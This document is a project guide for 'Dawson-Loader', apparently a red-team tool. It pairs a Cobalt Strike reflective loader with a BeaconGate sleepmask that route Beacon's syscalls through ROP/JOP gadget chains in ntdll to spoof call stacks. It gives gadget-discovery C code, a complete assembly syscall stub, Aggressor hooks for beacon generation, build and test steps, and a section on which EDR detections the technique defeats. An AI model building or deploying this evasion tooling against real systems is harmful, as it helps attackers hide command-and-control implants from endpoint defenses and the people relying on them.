# Dawson-Loader: Comprehensive Jopcall Integration Guide

## Overview

This project implements **jopcall** (ROP/JOP-based syscall obfuscation) for **both** Beacon loading (uDRL) and runtime operations (BeaconGate), providing complete call stack obfuscation throughout the entire Beacon lifecycle.

### What is Jopcall?

**Jopcall** is a technique that uses Return-Oriented Programming (ROP) and Jump-Oriented Programming (JOP) gadgets to obfuscate syscall return addresses. Instead of returning directly from syscalls to your implant code (which EDR can detect), syscalls return through a chain of legitimate ntdll.dll instructions, making the call stack appear benign.

**Original Project**: https://github.com/NoahKirchner/jopcall

## Architecture

```
┌────────────────────────────────────────────────────────────────┐
│  Phase 1: BEACON LOADING (uDRL)                                │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  DawsonLoader (dist/DawsonLoader.x64.o)                  │  │
│  │  ├─ Discovers ROP/JOP gadgets in ntdll at load time      │  │
│  │  ├─ Uses jop_syscall() for NtAllocateVirtualMemory       │  │
│  │  ├─ Uses jop_syscall() for NtProtectVirtualMemory        │  │
│  │  └─ Maps Beacon DLL into memory reflectively             │  │
│  └──────────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────────┘
                            ↓
┌────────────────────────────────────────────────────────────────┐
│  Phase 2: BEACON RUNTIME (BeaconGate/Sleepmask)                │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  Sleepmask-VS jopcall-sleepmask (BOF)                    │  │
│  │  ├─ Intercepts Beacon WinAPI calls                       │  │
│  │  ├─ Routes to _Nt* wrapper functions                     │  │
│  │  ├─ Uses DoJopSyscall() with ROP chains                  │  │
│  │  └─ All 16 core syscalls use jopcall obfuscation         │  │
│  └──────────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────────┘
```

## Project Structure

```
dawson-loader/
├── src/
│   ├── DawsonLoader.c         # uDRL implementation with jopcall
│   ├── DawsonLoader.h         # Header with ROP/JOP structures
│   └── jopcall_integration.c  # Gadget discovery functions
├── dist/
│   ├── DawsonLoader.x64.o     # Compiled uDRL object (25KB)
│   └── DawsonLoader.cna       # Aggressor script for CS integration
├── Sleepmask-VS/
│   └── sleepmask-vs/
│       ├── jopcall-sleepmask.cpp              # BeaconGate entry point
│       └── library/
│           ├── jopcallsyscalls.h              # Jopcall header
│           └── jopcallsyscalls.cpp            # Runtime jopcall implementation
├── Makefile                                   # Build system
└── JOPCALL_INTEGRATION_GUIDE.md              # This file
```

## Component Breakdown

### 1. DawsonLoader uDRL (Loading Phase)

**Purpose**: Reflectively load Beacon DLL using jopcall-obfuscated syscalls

**Key Files**:
- `src/DawsonLoader.c:45-50` - Initializes gadget chain on first run
- `src/DawsonLoader.c:1736-1799` - `jop_syscall()` assembly function
- `src/jopcall_integration.c` - Gadget discovery (ported from Rust to C)

**How It Works**:
1. At load time, scans ntdll.dll for ROP/JOP gadgets:
   - `jmp rcx` (0xFF 0xE1) - Jump to syscall
   - `ret` (0xC3) - Return chain gadgets
2. Stores gadgets in static `GadgetChain` structure
3. For memory operations, calls `jop_syscall()` instead of direct syscalls
4. `jop_syscall()` pushes gadgets onto stack, jumps to first gadget
5. Syscall executes and returns through gadget chain
6. Call stack appears to be entirely within ntdll.dll

**Syscalls Using Jopcall**:
- `NtAllocateVirtualMemory` (beacon memory allocation)
- `NtProtectVirtualMemory` (DLL stomping, heap allocator, memory protection changes)

**Build**: `make dawsonloader`

**Output**: `dist/DawsonLoader.x64.o` (25KB relocatable object file)

---

### 2. Sleepmask-VS BeaconGate (Runtime Phase)

**Purpose**: Intercept and obfuscate Beacon's WinAPI calls during execution

**Key Files**:
- `jopcall-sleepmask.cpp` - Main entry point, routes BEACON_GATE calls
- `library/jopcallsyscalls.h` - Header with structures and function declarations
- `library/jopcallsyscalls.cpp` - C++ implementation with 16 syscall wrappers

**How It Works**:
1. Beacon calls WinAPI function (e.g., `VirtualAlloc`)
2. BeaconGate intercepts call, routes to `sleep_mask()`
3. `sleep_mask()` calls `SysCallDispatcher()`
4. Dispatcher routes to appropriate `_Nt*` wrapper function
5. Wrapper function:
   - Initializes jopcall context (if not already done)
   - Calls `PrepareJopcall()` to set syscall number and jump address
   - Calls `DoJopSyscall()` assembly function
6. `DoJopSyscall()` executes syscall through ROP gadget chain
7. Returns result to Beacon

**Supported Syscalls** (16 total):
- **Memory**: NtAllocateVirtualMemory, NtProtectVirtualMemory, NtFreeVirtualMemory, NtQueryVirtualMemory
- **Sections**: NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection
- **Process Memory**: NtReadVirtualMemory, NtWriteVirtualMemory
- **Threads**: NtCreateThreadEx, NtGetContextThread, NtSetContextThread, NtResumeThread
- **Handles**: NtOpenProcess, NtOpenThread, NtClose, NtDuplicateObject

**Build**: Requires Visual Studio 2022 with Clang compiler (see Sleepmask-VS/README.md)

---

## Technical Deep Dive

### Gadget Discovery Algorithm

```c
// 1. Parse PE headers to find executable sections
DWORD section_count = get_image_memory_sections(ntdll_base, sections, 16);

// 2. Search for specific byte patterns
BYTE jmp_rcx[] = {0xFF, 0xE1};          // jmp rcx - transfers control to syscall
BYTE ret[] = {0xC3};                     // ret - return chain links
BYTE syscall_ret[] = {0x0F, 0x05, 0xC3}; // syscall; ret - actual syscall instruction

// 3. Store random gadgets for diversity
chain->gadgets[0] = pick_random_gadget(jmp_gadgets, jmp_count);  // jmp rcx
chain->gadgets[1] = pick_random_gadget(ret_gadgets, ret_count);  // ret
chain->gadgets[2] = pick_random_gadget(ret_gadgets, ret_count);  // ret
chain->gadgets[3] = pick_random_gadget(ret_gadgets, ret_count);  // ret
```

### jop_syscall Assembly Walkthrough

```asm
jop_syscall:
    ; 1. Save callee-saved registers
    mov [rsp - 0x8], rsi
    mov [rsp - 0x10], rdi
    mov [rsp - 0x18], r12
    mov [rsp - 0x20], r14

    ; 2. Push gadgets onto stack (LIFO order)
    ;    These will be the return addresses after syscall
    mov r11, rcx                    ; r11 = gadget_list pointer
    mov r14w, dx                    ; r14 = gadget_count
    shl r14, 3                      ; r14 = gadget_count * 8 (pointer size)

push_gadgets:
    push qword ptr [r11 + rax]      ; Push gadget address to stack
    sub rax, 0x08
    cmp rax, 0
    jne push_gadgets

    ; 3. Setup syscall registers
    mov r11, [r11]                  ; r11 = first gadget (jmp rcx)
    mov eax, r8d                    ; eax = syscall number
    mov r12, r9                     ; r12 = syscall address

    ; 4. Load syscall arguments
    mov r10, [rsp + 0x28]           ; arg1 (r10 = rcx for syscalls)
    mov rdx, [rsp + 0x30]           ; arg2
    mov r8,  [rsp + 0x38]           ; arg3
    mov r9,  [rsp + 0x40]           ; arg4
    ; arg5 remains at [rsp + 0x48]

    ; 5. Restore registers and jump to gadget
    mov rcx, r12                    ; rcx = syscall address (for jmp rcx gadget)
    mov rsi, [rsp - 0x8]
    mov rdi, [rsp - 0x10]
    mov r12, [rsp - 0x18]
    mov r14, [rsp - 0x20]

    jmp r11                         ; Jump to "jmp rcx" gadget

    ; Execution flow:
    ; jmp r11 → jmp rcx gadget (0xFF 0xE1)
    ;         → rcx points to syscall → syscall executes
    ;         → syscall returns to gadget_3 on stack
    ;         → gadget_3 executes (ret)
    ;         → returns to gadget_2
    ;         → gadget_2 executes (ret)
    ;         → returns to gadget_1
    ;         → gadget_1 executes (ret)
    ;         → returns to original caller
```

### Call Stack Comparison

**Without Jopcall** (Detected by EDR):
```
[0] ntdll.dll!NtAllocateVirtualMemory+0x14
[1] beacon.dll+0x4523                        ← SUSPICIOUS: Unbacked memory
[2] beacon.dll+0x1234                        ← SUSPICIOUS: No exports
[3] ntdll.dll!RtlUserThreadStart
```

**With Jopcall** (Appears Legitimate):
```
[0] ntdll.dll!NtAllocateVirtualMemory+0x14
[1] ntdll.dll!RtlQueryPerformanceCounter+0x1a  ← ret gadget
[2] ntdll.dll!RtlCaptureContext+0x2f           ← ret gadget
[3] ntdll.dll!RtlUserThreadStart+0x21          ← ret gadget
[4] ntdll.dll!RtlUserThreadStart
```

---

## Cobalt Strike Integration

### 1. Loading the uDRL

**Aggressor Script** (`dist/DawsonLoader.cna`):
```cna
# Hook beacon generation
on beacon_rdll_generate {
    local('$barch $rdll_data');
    ($barch, $rdll_data) = @_;

    # Read compiled uDRL object file
    $rdll_data = read_file("dist/DawsonLoader.x64.o");

    # Return modified RDLL to Cobalt Strike
    return $rdll_data;
}
```

**In Cobalt Strike**:
1. Load script: `Script Manager` → Load → `dist/DawsonLoader.cna`
2. Generate beacon: The uDRL will be automatically injected
3. All beacons will now use jopcall for loading

### 2. Loading the Sleepmask

**Aggressor Script** (`Sleepmask-VS/sleepmask.cna`):
```cna
# Configure sleepmask in C2 profile
stage {
    set sleep_mask "true";
}

# Load compiled sleepmask BOF
beacon_gate {
    # Specify path to jopcall-sleepmask.o
    set sleepmask_path "/path/to/jopcall-sleepmask.o";
}
```

**In Cobalt Strike**:
1. Compile jopcall-sleepmask in Visual Studio (Release, x64)
2. Load `sleepmask.cna` in Script Manager
3. New beacons will use jopcall for runtime operations

---

## Building & Testing

### Build DawsonLoader uDRL

```bash
# Prerequisites
sudo apt install mingw-w64

# Build
cd /path/to/dawson-loader
make clean
make dawsonloader

# Verify output
ls -lh dist/DawsonLoader.x64.o
file dist/DawsonLoader.x64.o
objdump -h dist/DawsonLoader.x64.o
```

**Expected Output**:
- `dist/DawsonLoader.x64.o` - 25KB Intel amd64 COFF object file
- Contains `.text`, `.rdata`, `.pdata`, `.xdata`, `.bss` sections

### Build Sleepmask-VS jopcall

#### Option 1: Windows Build (Recommended)

Sleepmask-VS uses the BOF-VS framework which is optimized for Windows tooling.

**Prerequisites**:
- Windows 10/11 development machine
- Visual Studio 2022 (Desktop Development with C++)
- Clang compiler for Windows

**Build Steps**:
1. Open `Sleepmask-VS/sleepmask-vs.sln` in Visual Studio
2. Switch build configuration to **Release** and platform to **x64**
3. Right-click `jopcall-sleepmask.cpp` in Solution Explorer
4. Select "Set as Startup Item" or ensure it's included in build
5. Build → Build Solution (Ctrl+Shift+B)
6. Output: `x64/Release/jopcall-sleepmask.o`

### Testing

#### Test DawsonLoader (uDRL)
1. Load `dist/DawsonLoader.cna` in Cobalt Strike
2. Generate x64 stageless beacon
3. Execute beacon on test system
4. Check beacon callback - if it calls back, loading succeeded
5. Use process explorer to verify beacon memory protections

#### Test Sleepmask (BeaconGate)
1. Enable debug logging: Set `ENABLE_LOGGING 1` in `Sleepmask-VS/sleepmask-vs/debug.h`
2. Rebuild Sleepmask
3. Load in Cobalt Strike
4. Generate beacon and execute
5. Use DbgView or WinDbg to view debug output:
   ```
   SLEEPMASK: Initializing jopcall ROP/JOP gadgets from ntdll...
   SLEEPMASK: Jopcall context initialized successfully. Gadget count: 4
   SLEEPMASK: Routing call to its sys call equivalent and executing jopcall syscall (ROP/JOP obfuscated)...
   ```

#### Verify Call Stack Obfuscation
```
# In WinDbg attached to beacon process:
.reload
~* k    # Show all thread call stacks

# Look for syscalls - return addresses should point to ntdll, not beacon memory
```

---

## EDR Evasion Benefits

### What Jopcall Defeats

1. **Call Stack Scanning**
   - EDR agents inspect call stacks during syscalls
   - Jopcall makes stacks appear entirely within ntdll.dll
   - No suspicious unbacked memory regions in call chain

2. **Return Address Analysis**
   - Traditional methods return directly to implant code
   - Jopcall returns through legitimate ntdll gadgets
   - Stack unwinds through multiple valid return addresses

3. **Heuristic Detection**
   - Syscalls from suspicious memory trigger alerts
   - Jopcall syscalls appear to originate from ntdll
   - Call chains match legitimate Windows processes

### Limitations

- **Does not bypass**: Userland API hooks, kernel callbacks, memory scanning
- **Best used with**: Process injection, module stomping, memory encryption
- **Performance**: Slight overhead from gadget execution (~5-10% slower)

---

## Troubleshooting

### DawsonLoader Build Errors

**Error**: `undefined reference to 'find_rop_gadgets'`
- **Cause**: jopcall_integration.o not linked
- **Fix**: Ensure Makefile links both object files:
  ```make
  x86_64-w64-mingw32-ld -r dist/DawsonLoader.o dist/jopcall_integration.o -o dist/DawsonLoader.x64.o
  ```

**Error**: Compilation warnings about integer/pointer conversions
- **Cause**: Strict type checking
- **Fix**: Already handled with `-Wno-int-conversion -Wno-incompatible-pointer-types` in Makefile

### Sleepmask Build Errors

**Error**: `'__asm' undeclared`
- **Cause**: Not using Clang compiler
- **Fix**: Visual Studio → Project Properties → C/C++ → General → Platform Toolset → "LLVM (clang-cl)"

**Error**: `gSysCallInfo undeclared`
- **Cause**: Missing extern declaration
- **Fix**: Already fixed in jopcallsyscalls.cpp line 278

### Runtime Issues

**Beacon doesn't call back**:
1. Check uDRL loaded correctly in Aggressor Console
2. Verify object file size is reasonable (20-30KB)
3. Test with standard RDLL first to isolate issue
4. Check antivirus quarantine logs

**Syscalls failing**:
1. Enable debug logging in debug.h
2. Check DbgView for "Jopcall context initialized" message
3. Verify gadgets found: "Gadget count: 4" or similar
4. If gadget count is 0 or 1, ntdll may be hooked

**Crashes during syscalls**:
1. Check stack alignment in DoJopSyscall assembly
2. Verify gadget addresses are valid executable memory
3. Use WinDbg to inspect crash:
   ```
   !analyze -v
   k    # Show call stack at crash
   ```

---

## Performance Considerations

### Gadget Discovery
- **When**: Once per beacon load/initialization
- **Time**: ~10-50ms depending on ntdll size
- **Impact**: Negligible (one-time cost)

### Syscall Execution
- **Overhead**: 5-10% slower than direct syscalls
- **Cause**: Additional gadget jumps/returns
- **Mitigation**: Cached gadgets, minimal overhead

### Memory Usage
- **uDRL**: +25KB for loader code
- **Sleepmask**: +15KB for runtime jopcall
- **Gadget Storage**: 40 bytes (5 pointers)

---

## Advanced Customization

### Increasing Gadget Chain Length

Edit `MAX_GADGET_CHAIN` in headers:
```c
// DawsonLoader.h and jopcallsyscalls.h
#define MAX_GADGET_CHAIN 8  // Increase from 5 to 8
```

Longer chains = more obfuscation but slower execution.

### Using Different Gadget Types

Add additional gadget searches in `find_rop_gadgets()`:
```c
// Search for pop rcx; ret
BYTE pop_rcx_ret[] = {0x59, 0xC3};
DWORD pop_count = search_gadget(pop_rcx_ret, sizeof(pop_rcx_ret), ...);
chain->gadgets[4] = pick_random_gadget(pop_gadgets, pop_count);
```

### Cross-Module Gadget Chains

Scan multiple DLLs for gadgets:
```c
PVOID kernel32_base = GetModuleHandleA("kernel32.dll");
find_rop_gadgets_in_module(kernel32_base, &chain2);

// Mix gadgets from ntdll and kernel32
chain->gadgets[0] = ntdll_gadgets[rand() % ntdll_count];
chain->gadgets[1] = kernel32_gadgets[rand() % kernel32_count];
```

---

## References

- **Jopcall Original Project**: https://github.com/NoahKirchner/jopcall
- **BokuLoader (Base Project)**: https://github.com/boku7/BokuLoader
- **Sleepmask-VS**: https://github.com/Cobalt-Strike/Sleepmask-VS (embedded in this repo)
- **BeaconGate Article**: https://www.cobaltstrike.com/blog/instrumenting-beacon-with-beacongate-for-call-stack-spoofing
- **Cobalt Strike uDRL Docs**: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_user-defined-rdll.htm
- **Return-Oriented Programming**: https://en.wikipedia.org/wiki/Return-oriented_programming

---

## Credits

- **Jopcall**: Noah Kirchner (@noahkirchner)
- **BokuLoader**: Bobby Cooke (@0xBoku)
- **DawsonLoader**: CTE Offensive Security Research Division
- **Sleepmask-VS**: Fortra/Cobalt Strike Team

---

## License

See LICENSE.md

---

## Support

For issues, questions, or contributions:
- Review this guide thoroughly
- Check troubleshooting section
- Examine debug output with ENABLE_LOGGING
- Test components individually (uDRL, then Sleepmask)

**Happy Hacking! 🔐**
